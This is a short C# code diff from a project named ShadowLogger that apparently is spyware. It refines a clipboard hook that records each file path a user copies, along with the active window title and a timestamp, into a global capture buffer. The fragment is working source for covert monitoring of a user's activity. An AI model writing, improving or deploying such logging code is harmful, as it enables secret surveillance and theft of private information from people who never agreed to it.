@@ -51,11 +51,11 @@ namespace ShadowLogger.bin.Hooks
         {
             string timenow = DateTime.Now.ToString("(dd-MM-yyyy" + "  " + "HH:mm:ss)");
 
-            int filecount = Clipboard.GetFileDropList().Count;
+            System.Collections.Specialized.StringCollection fileList = Clipboard.GetFileDropList();
 
-            if (filecount != 0)
+            if (fileList != null)
             {
-                foreach (string filepath in Clipboard.GetFileDropList())
+                foreach (string filepath in fileList)
                 {
                     GlobalVariables.GlobalVariables.CbData += "FILEDROP: " + filepath + " - " + HostInfo.HostInfo.GetActiveWindowTitle(IntPtr.Zero) + "   " + timenow + Environment.NewLine;
                 }
